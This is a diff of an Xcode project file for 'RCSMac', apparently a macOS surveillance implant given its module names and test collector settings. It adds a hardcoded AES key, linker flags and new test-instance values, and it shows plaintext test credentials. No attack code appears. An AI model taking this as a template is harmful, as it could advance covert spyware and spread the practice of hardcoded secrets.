@@ -429,6 +429,7 @@
 		CC31C80F16DCB5FB00922BD6 /* RCSMTask.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMTask.m; path = Support/RCSMTask.m; sourceTree = "<group>"; };
 		CC3718AF16DE0EFA00658703 /* libsqlite3.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libsqlite3.dylib; path = Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.6.sdk/usr/lib/libsqlite3.dylib; sourceTree = DEVELOPER_DIR; };
 		CC7ED16515C95CB100F90517 /* RCSMAVGarbage.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAVGarbage.h; path = Support/RCSMAVGarbage.h; sourceTree = "<group>"; };
+		CCCBE263183CFEEB00F626A3 /* RCSMInputmanager_aes.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMInputmanager_aes.h; path = Modules/RCSMInputmanager_aes.h; sourceTree = "<group>"; };
 		CCE75B5C15E7836F00879615 /* RCSMInterface.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSMInterface.h; sourceTree = "<group>"; };
 		CCFFD70415D8ED6E00131597 /* RCSMGlobals.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSMGlobals.h; sourceTree = "<group>"; };
 		CCFFD70515D8ED6E00131597 /* RCSMGlobals.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RCSMGlobals.m; sourceTree = "<group>"; };
@@ -514,6 +515,7 @@
 				52B8502415146D4E00F0D72E /* SBJSon */,
 				1AE6B5610F8E2574004736EA /* Agents */,
 				1ADC5D7D12DDBE4E00650A1E /* Network */,
+				CCCBE263183CFEEB00F626A3 /* RCSMInputmanager_aes.h */,
 				1A7FD43B12F1CED900361B0B /* RCSMFileSystemManager.h */,
 				1A7FD43C12F1CED900361B0B /* RCSMFileSystemManager.m */,
 				1A4434830F8B950B00CD910E /* RCSMConfManager.h */,
@@ -1448,6 +1450,7 @@
 		1AF6100B0FA72D8A003F2C12 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AES_ENC_KEY = pippo;
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ENABLE_OBJC_ARC = NO;
 				COMBINE_HIDPI_IMAGES = YES;
@@ -1495,6 +1498,7 @@
 		1AF6100C0FA72D8A003F2C12 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AES_ENC_KEY = pippo;
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
 				CLANG_ENABLE_OBJC_ARC = NO;
@@ -1600,8 +1604,8 @@
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
 				COMBINE_HIDPI_IMAGES = YES;
-				COPY_PHASE_STRIP = YES;
-				DEBUG_INFORMATION_FORMAT = dwarf;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_MODEL_TUNING = G5;
 				GCC_OPTIMIZATION_LEVEL = 0;
@@ -1618,13 +1622,18 @@
 				);
 				MACOSX_DEPLOYMENT_TARGET = 10.7;
 				ONLY_ACTIVE_ARCH = YES;
+				OTHER_LDFLAGS = (
+					"-Wl,-search_paths_first",
+					"-lspeex",
+					"-Wl,-headerpad,0x3000",
+				);
 				PRODUCT_NAME = RCSMac;
 				RCS_TEST_COLLECTOR = 192.168.100.100;
-				RCS_TEST_INSTANCE = RCS_0000001486;
+				RCS_TEST_INSTANCE = RCS_0000001730;
 				RCS_TEST_PASSWD = osx_test;
-				RCS_TEST_SYNCH = NO;
+				RCS_TEST_SYNCH = YES;
 				RCS_TEST_USER = osxtest;
-				SDKROOT = macosx10.7;
+				SDKROOT = macosx10.9;
 				VALID_ARCHS = i386;
 			};
 			name = Debug;
@@ -1641,7 +1650,7 @@
 				GCC_PRECOMPILE_PREFIX_HEADER = YES;
 				GCC_PREFIX_HEADER = RCSMac_Prefix.pch;
 				GCC_SYMBOLS_PRIVATE_EXTERN = YES;
-				GCC_VERSION = com.apple.compilers.llvmgcc42;
+				GCC_VERSION = "";
 				INFOPLIST_FILE = Info.plist;
 				INSTALL_PATH = "$(HOME)/Applications";
 				LIBRARY_SEARCH_PATHS = (
@@ -1653,13 +1662,18 @@
 				);
 				MACOSX_DEPLOYMENT_TARGET = 10.7;
 				ONLY_ACTIVE_ARCH = YES;
+				OTHER_LDFLAGS = (
+					"-Wl,-search_paths_first",
+					"-Wl,-headerpad,0x3000",
+					"-lspeex",
+				);
 				PRODUCT_NAME = RCSMac;
 				RCS_TEST_COLLECTOR = 192.168.100.100;
-				RCS_TEST_INSTANCE = RCS_0000001486;
+				RCS_TEST_INSTANCE = RCS_0000001730;
 				RCS_TEST_PASSWD = osx_test;
-				RCS_TEST_SYNCH = NO;
+				RCS_TEST_SYNCH = YES;
 				RCS_TEST_USER = osxtest;
-				SDKROOT = macosx10.7;
+				SDKROOT = macosx10.9;
 				STANDARD_C_PLUS_PLUS_LIBRARY_TYPE = YES;
 				VALID_ARCHS = i386;
 			};
